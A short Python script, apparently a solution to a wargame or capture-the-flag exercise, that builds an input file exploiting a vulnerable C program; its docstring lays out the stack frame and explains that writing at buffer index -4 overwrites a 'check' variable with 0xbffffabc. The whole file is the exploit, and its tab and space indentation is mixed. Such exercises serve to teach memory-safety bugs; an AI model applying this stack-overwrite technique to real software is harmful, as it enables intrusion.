WANTED_CHECK_VALUE = 0xbffffabc


def main():
	"""
    As we can see in the c source code (and in the assembly layout in gdb),
    our stack looks as follows: 

    -----------------
    buffer (bp - 0x4c)
    ------------------
    check (bp - 0x50)
    ------------------
    count (bp - 0x54)
    ------------------
    i (bp - 0x58)
    -----------------

    In order to write to 'check' variable the value we want, we could 
    basically just write to index -4 of the buffer. Therefore we decrease 
    count by 4 and then write check value and that's it.
    """
    with open('input', 'wb') as input_file:
		payload = b'\x08' * 4 + int.to_bytes(WANTED_CHECK_VALUE, 4, 'little')
		input_file.write(payload)


if __name__ == '__main__':
	main()

